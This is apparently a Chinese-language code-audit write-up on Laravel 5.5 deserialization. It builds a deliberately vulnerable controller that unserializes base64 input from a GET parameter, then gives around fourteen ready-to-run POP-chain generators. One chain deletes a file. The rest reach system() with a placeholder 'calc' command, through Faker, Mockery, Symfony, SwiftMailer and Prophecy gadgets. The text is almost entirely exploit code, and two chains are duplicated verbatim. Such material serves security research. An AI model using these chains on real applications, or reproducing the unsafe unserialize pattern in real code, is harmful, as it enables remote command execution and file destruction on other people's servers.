# 环境搭建
> [源码下载链接]()

> 在 `routes/web.php` 中添加路由

```php
Route::get('/', "DemoController@demo");
```

> 在 `app/Http/Controllers` 目录下添加控制器

```php
<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request;
class DemoController extends Controller
{
    public function demo()
    {
        highlight_file(__FILE__);
        if(isset($_GET['data'])){
            $filename = "C:\Tools\phpstudy_pro\WWW\laravel55\public\info.php";
            @unserialize(base64_decode($_GET['data']));
            if(file_exists($filename)){
                echo $filename." is exit!".PHP_EOL;
            }else{
                echo $filename." has been deleted!".PHP_EOL;
            }
        }
    }
}
```

# 漏洞分析
> Laravel5.5 中并没有修复之前审计 Laravel5.4 和 Laravel5.1 的序列化漏洞，因此这一次能在 Laravel5.5 打通的之前的反序列化漏洞的链子就不做分析了(ps:Laravel51的链子在Laravel54应该也可以打通，之前审Laravel54的时候没考虑这么多)

## POC链-1(文件删除漏洞)
> 参考 Laravel5.1 代码审计中的 `POC链-1`

### exp
```php
<?php
namespace Symfony\Component\Process\Pipes {
    class WindowsPipes {
        private $files = array();
        function __construct() {
            $this->files = array("C:/Tools/phpstudy_pro/WWW/laravel55/public/info.php");
        }
    }
    echo base64_encode(serialize(new WindowsPipes()));
}
?>
```


## POC链-2
> 参考 Laravel5.4 代码审计中的 `POC链-1`

### exp
```php
<?php
namespace Illuminate\Broadcasting {
    class PendingBroadcast {
        protected $events;
        protected $event;
        function __construct($events="", $event="") {
            $this->events = $events;
            $this->event = $event;
        }
    }
}

namespace Faker {
    class Generator {
        protected $formatters = array();
        function __construct($func="") {
            $this->formatters = ['dispatch' => $func];
        }
    }
}

namespace {
    $demo1 =  new Faker\Generator("system");
    $demo2 = new Illuminate\Broadcasting\PendingBroadcast($demo1, "calc");
    echo base64_encode(serialize($demo2));
}
?>
```

## POC链-3
> 参考 Laravel5.4 代码审计中的 `POC链-2`

### exp
```php
<?php
namespace Illuminate\Validation {
    class Validator {
       public $extensions = [];
       public function __construct() {
            $this->extensions = ['' => 'system'];
       }
    }
}

namespace Illuminate\Broadcasting {
    use  Illuminate\Validation\Validator;
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct($cmd)
        {
            $this->events = new Validator();
            $this->event = $cmd;
        }
    }
    echo base64_encode(serialize(new PendingBroadcast('calc')));
}
?>
```

## POC链-4
> 参考 Laravel5.4 代码审计中的 `POC链-3`

### exp
```php
<?php
namespace Illuminate\Notifications {
    class ChannelManager {
        protected $app;
        protected $customCreators;
        protected $defaultChannel;
        public function __construct() {
            $this->app = 'calc';
            $this->defaultChannel = 'H3rmesk1t';
            $this->customCreators = ['H3rmesk1t' => 'system'];
        }
    }
}


namespace Illuminate\Broadcasting {
    use  Illuminate\Notifications\ChannelManager;
    class PendingBroadcast {
        protected $events;
        public function __construct()
        {
            $this->events = new ChannelManager();
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```

## POC链-5
> 参考 Laravel5.4 代码审计中的 `POC链-4`

### exp
```php
<?php
namespace Illuminate\Events {
    class Dispatcher {
        protected $listeners = [];
        public function __construct() {
            $this->listeners = ["calc" => ["system"]];
        }
    }
}



namespace Illuminate\Broadcasting {
    use  Illuminate\Events\Dispatcher;
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct() {
            $this->events = new Dispatcher();
            $this->event = "calc";
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```

## POC链-6
> 参考 Laravel5.4 代码审计中的 `POC链-5`

### exp
```php
<?php
namespace Illuminate\Bus {
    class Dispatcher {
        protected $queueResolver = "system";
    }
}

namespace Illuminate\Broadcasting {
    use  Illuminate\Bus\Dispatcher;
    class BroadcastEvent {
        public $connection;
        public $event;
        public function __construct() {
            $this->event = "calc";
            $this->connection = $this->event;
        }
    }
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct() {
            $this->events = new Dispatcher();
            $this->event = new BroadcastEvent();
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```

## POC链-7
> 参考 Laravel5.4 代码审计中的 `POC链-6`

### exp-1
```php
<?php
namespace Mockery\Generator {
    class MockConfiguration {
        protected $name = 'H3rmesk1t';
    }
    class MockDefinition {
        protected $config;
        protected $code;
        public function __construct() {
            $this->config = new MockConfiguration();
            $this->code = "<?php system('calc');?>";
        }
    }
}

namespace Mockery\Loader {
    class EvalLoader {}
}

namespace Illuminate\Bus {
    use Mockery\Loader\EvalLoader;
    class Dispatcher {
        protected $queueResolver;
        public function __construct() {
            $this->queueResolver = [new EvalLoader(), 'load'];
        }
    }
}

namespace Illuminate\Broadcasting {
    use Illuminate\Bus\Dispatcher;
    use Mockery\Generator\MockDefinition;
    class BroadcastEvent {
        public $connection;
        public function __construct() {
            $this->connection = new MockDefinition();
        }
    }
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct() {
            $this->events = new Dispatcher();
            $this->event = new BroadcastEvent();
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```

### exp-2
```php
<?php
namespace Symfony\Component\HttpFoundation {
    class Cookie {
        protected $name = "H3rmesk1t";
    }
}

namespace Mockery\Generator {
    use Symfony\Component\HttpFoundation\Cookie;
    class MockDefinition {
        protected $config;
        protected $code;
        public function __construct($code) {
            $this->config = new Cookie();
            $this->code = $code;
        }
    }
}

namespace Mockery\Loader {
    class EvalLoader {}
}

namespace Illuminate\Bus {
    use Mockery\Loader\EvalLoader;
    class Dispatcher {
        protected $queueResolver;
        public function __construct() {
            $this->queueResolver = [new EvalLoader(), 'load'];
        }
    }
}

namespace Illuminate\Broadcasting {
    use Illuminate\Bus\Dispatcher;
    use Mockery\Generator\MockDefinition;
    class BroadcastEvent {
        public $connection;
        public function __construct() {
            $this->connection = new MockDefinition("<?php system('calc');?>");
        }
    }
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct() {
            $this->events = new Dispatcher();
            $this->event = new BroadcastEvent();
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```

## POC链-8
> 参考 Laravel5.1 代码审计中的 `POC链-3`，注意将 `$_path` 换成 `$path`，将 `$_keys` 换成 `$keys`

### exp
```php
<?php 
namespace Faker {
    class DefaultGenerator {
        protected $default;
        public function __construct($payload) {
            $this->default = $payload;
        }
    }
    class ValidGenerator {
        protected $generator;
        protected $validator;
        protected $maxRetries;
        public function __construct($payload) {
            $this->generator = new DefaultGenerator($payload);
            $this->validator = "system";
            $this->maxRetries = 1; // 不设置值的话默认是重复10000次
        }
    }
}

namespace Mockery\Generator {
    use Faker\ValidGenerator;
    class DefinedTargetClass {
        private $rfc;
        public function __construct($payload) {
            $this->rfc = new ValidGenerator($payload);
        }
    }
}

namespace {
    use Mockery\Generator\DefinedTargetClass;
    class Swift_KeyCache_DiskKeyCache {
        private $path;
        private $keys = ['H3rmesk1t' => ['H3rmesk1t' => 'H3rmesk1t']];
        public function __construct($payload) {
            $this->path = new DefinedTargetClass($payload);
        }
    }
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache("calc")));
}
?>
```

## POC链-9
> 参考 Laravel5.1 代码审计中的 `POC链-4`，注意将 `$_headers` 换成 `$headers`

### exp
```php
<?php 
namespace Faker {
    class DefaultGenerator {
        protected $default;
        public function __construct($payload) {
            $this->default = $payload;
        }
    }
    class ValidGenerator {
        protected $generator;
        protected $validator;
        protected $maxRetries;
        public function __construct($payload) {
            $this->generator = new DefaultGenerator($payload);
            $this->validator = "system";
            $this->maxRetries = 1; // 不设置值的话默认是重复10000次
        }
    }
}

namespace {
    use Faker\ValidGenerator;
    class Swift_Mime_SimpleMimeEntity {
        private $headers;
        public function __construct($payload) {
            $this->headers = new ValidGenerator($payload);
        }
    }
    class Swift_KeyCache_DiskKeyCache {
        private $path;
        private $keys = ['H3rmesk1t' => ['H3rmesk1t' => 'H3rmesk1t']];
        public function __construct($payload) {
            $this->path = new Swift_Mime_SimpleMimeEntity($payload);
        }
    }
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache("calc")));
}
?>
```

## POC链-10
> 参考 Laravel5.1 代码审计中的 `POC链-5`，注意将 `$_path` 换成 `$path`，将 `$_keys` 换成 `$keys`

### exp
```php
<?php 
namespace Faker {
    class Generator {
        protected $formatters = array();
        function __construct() {
            $this->formatters = ['stringify' => "system"];
        }
    }
}

namespace Prophecy\Argument\Token {
    use Faker\Generator;
    class ObjectStateToken {
        private $name;
        private $value;
        private $util;
        public function __construct($payload) {
            $this->name = "H3rmesk1t";
            $this->util = new Generator();;
            $this->value = $payload;
        }
    }
}

namespace {
    use Prophecy\Argument\Token\ObjectStateToken;
    class Swift_KeyCache_DiskKeyCache {
        private $path;
        private $keys = ['H3rmesk1t' => ['H3rmesk1t' => 'H3rmesk1t']];
        public function __construct($payload) {
            $this->path = new ObjectStateToken($payload);
        }
    }
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache("calc")));
}
?>
```

## POC链-11
> 参考 Laravel5.1 代码审计中的 `POC链-6`，注意将 `$_path` 换成 `$path`，将 `$_keys` 换成 `$keys`

### exp
```php
<?php 
namespace Faker {
    class Generator {
        protected $formatters = array();
        function __construct() {
            $this->formatters = ['stringify' => "system"];
        }
    }
}

namespace Prophecy\Argument\Token {
    use Faker\Generator;
    class IdenticalValueToken {
        private $string;
        private $value;
        private $util;
        public function __construct($payload) {
            $this->name = null;
            $this->util = new Generator();;
            $this->value = $payload;
        }
    }
}

namespace {
    use Prophecy\Argument\Token\IdenticalValueToken;
    class Swift_KeyCache_DiskKeyCache {
        private $path;
        private $keys = ['H3rmesk1t' => ['H3rmesk1t' => 'H3rmesk1t']];
        public function __construct($payload) {
            $this->path = new IdenticalValueToken($payload);
        }
    }
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache("calc")));
}
?>
```

## POC链-12
> 参考 Laravel5.1 代码审计中的 `POC链-7`，注意将 `$_path` 换成 `$path`，将 `$_keys` 换成 `$keys`

### exp
```php
<?php 
namespace Faker {
    class Generator {
        protected $formatters = array();
        function __construct() {
            $this->formatters = ['stringify' => "system"];
        }
    }
}

namespace Prophecy\Argument\Token {
    use Faker\Generator;
    class ExactValueToken {
        private $string;
        private $value;
        private $util;
        public function __construct($payload) {
            $this->name = null;
            $this->util = new Generator();;
            $this->value = $payload;
        }
    }
}

namespace {
    use Prophecy\Argument\Token\ExactValueToken;
    class Swift_KeyCache_DiskKeyCache {
        private $path;
        private $keys = ['H3rmesk1t' => ['H3rmesk1t' => 'H3rmesk1t']];
        public function __construct($payload) {
            $this->path = new ExactValueToken($payload);
        }
    }
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache("calc")));
}
?>
```

## POC链-13
> 参考 Laravel5.1 代码审计中的 `POC链-7`，注意将 `$_path` 换成 `$path`，将 `$_keys` 换成 `$keys`

### exp
```php
<?php 
namespace Faker {
    class Generator {
        protected $formatters = array();
        function __construct() {
            $this->formatters = ['stringify' => "system"];
        }
    }
}

namespace Prophecy\Argument\Token {
    use Faker\Generator;
    class ExactValueToken {
        private $string;
        private $value;
        private $util;
        public function __construct($payload) {
            $this->name = null;
            $this->util = new Generator();;
            $this->value = $payload;
        }
    }
}

namespace {
    use Prophecy\Argument\Token\ExactValueToken;
    class Swift_KeyCache_DiskKeyCache {
        private $path;
        private $keys = ['H3rmesk1t' => ['H3rmesk1t' => 'H3rmesk1t']];
        public function __construct($payload) {
            $this->path = new ExactValueToken($payload);
        }
    }
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache("calc")));
}
?>
```

## POC链-14
> 参考 Laravel5.1 代码审计中的 `POC链-8`，注意将 `$_path` 换成 `$path`，将 `$_keys` 换成 `$keys`

### exp
```php
<?php 
namespace Illuminate\Database{
    class DatabaseManager{
        protected $app;
        protected $extensions ;
        public function __construct($payload)
        {
            $this->app['config']['database.default'] = $payload;
            $this->app['config']['database.connections'] = [$payload => 'system'];
            $this->extensions[$payload]='call_user_func';
        }
    }
}

namespace Mockery\Generator {
    use Illuminate\Database\DatabaseManager;
    class DefinedTargetClass {
        private $rfc;
        public function __construct($payload) {
            $this->rfc = new DatabaseManager($payload);
        }
    }
}

namespace {
    use Mockery\Generator\DefinedTargetClass;
    class Swift_KeyCache_DiskKeyCache {
        private $path;
        private $keys = ['H3rmesk1t' => ['H3rmesk1t' => 'H3rmesk1t']];
        public function __construct($payload) {
            $this->path = new DefinedTargetClass($payload);
        }
    }
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache("calc")));
}
?>
```